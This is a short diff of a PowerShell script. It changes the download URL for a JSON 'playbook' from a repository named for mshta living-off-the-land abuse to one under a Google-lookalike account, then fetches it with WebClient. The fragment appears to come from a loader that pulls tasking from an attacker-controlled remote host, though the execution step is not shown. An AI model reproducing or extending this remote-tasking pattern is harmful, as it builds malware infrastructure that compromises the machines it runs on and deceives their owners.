@@ -10,7 +10,7 @@ try {
 }
 
 # Download JSON playbook from the new short URL
-$taskUrl = "https://raw.githubusercontent.com/shateel/lotl-mshta/refs/heads/main/task.json"
+$taskUrl = "https://raw.githubusercontent.com/g00glecenter101-arch/msht/refs/heads/main/task.json"
 Write-Host "Download: $taskUrl" -ForegroundColor Cyan
 try {
     $raw = (New-Object System.Net.WebClient).DownloadString($taskUrl)
